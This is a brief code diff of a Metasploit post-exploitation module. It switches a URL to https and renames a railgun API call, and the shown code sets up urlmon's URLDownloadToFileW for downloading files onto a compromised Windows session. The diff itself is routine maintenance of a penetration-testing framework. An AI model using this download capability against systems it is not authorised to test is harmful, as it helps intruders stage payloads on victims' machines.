@@ -1,10 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
 
   def initialize(info={})
@@ -42,7 +41,7 @@ class MetasploitModule < Msf::Post
 
   def add_railgun_urlmon
 
-    if client.railgun.dlls.find_all {|d| d.first == 'urlmon'}.empty?
+    if client.railgun.libraries.find_all {|d| d.first == 'urlmon'}.empty?
       session.railgun.add_dll('urlmon','urlmon')
       session.railgun.add_function(
         'urlmon', 'URLDownloadToFileW', 'DWORD',
